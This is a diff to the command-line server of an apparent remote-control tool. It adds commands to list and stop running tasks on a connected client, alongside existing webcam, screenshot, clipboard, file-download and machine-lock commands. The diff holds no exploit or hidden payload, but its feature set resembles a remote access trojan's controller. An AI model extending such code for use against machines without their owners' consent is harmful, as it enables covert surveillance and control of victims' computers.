@@ -7,7 +7,7 @@ from contextlib import suppress
 from cryptography import x509
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import ec
-from modules import clipboard, download, filetransfer, screenshot, webcam, windows
+from modules import clipboard, download, filetransfer, screenshot, webcam, windows, tasks
 from modules.baseserver import BaseServer
 from utils import terminal
 from utils.timeout_handler import TimeoutSetter
@@ -43,7 +43,9 @@ paste
 receive
 send
 download
-lock (windows only)
+lock [windows only]
+tasks
+stoptask (task id)
 disconnect
 exit
 """
@@ -264,9 +266,9 @@ class ServerCLI(BaseServer, cmd.Cmd):
         if self.__check_select(): return
 
         url = input('File URL: ')
-        save_name = input('Save file as: ')
+        filename = input('Save file as: ')
         try:
-            download.download(self.client, url, save_name)
+            download.download(self.client, url, filename)
         except RuntimeError as error:
             print(str(error))
         else:
@@ -282,6 +284,26 @@ class ServerCLI(BaseServer, cmd.Cmd):
             print(str(error))
         else:
             print('Successfully locked client machine.')
+
+    def do_tasks(self, _) -> None:
+        """ Fetch all running tasks """
+        if self.__check_select(): return
+
+        tasklist = tasks.tasks(self.client)
+        terminal.task_print(tasklist)
+
+    def do_stoptask(self, task_id: str) -> None:
+        """ Stop a task on a client """
+        if self.__check_select(): return
+
+        if not task_id:
+            print("Usage: stoptask (task id)")
+            return
+
+        if tasks.stoptask(self.client, task_id.strip()):
+            print("Stopped task.")
+        else:
+            print("Task doesn't exist.")
 
     def do_disconnect(self, _) -> None:
         """ Disconnect a client """
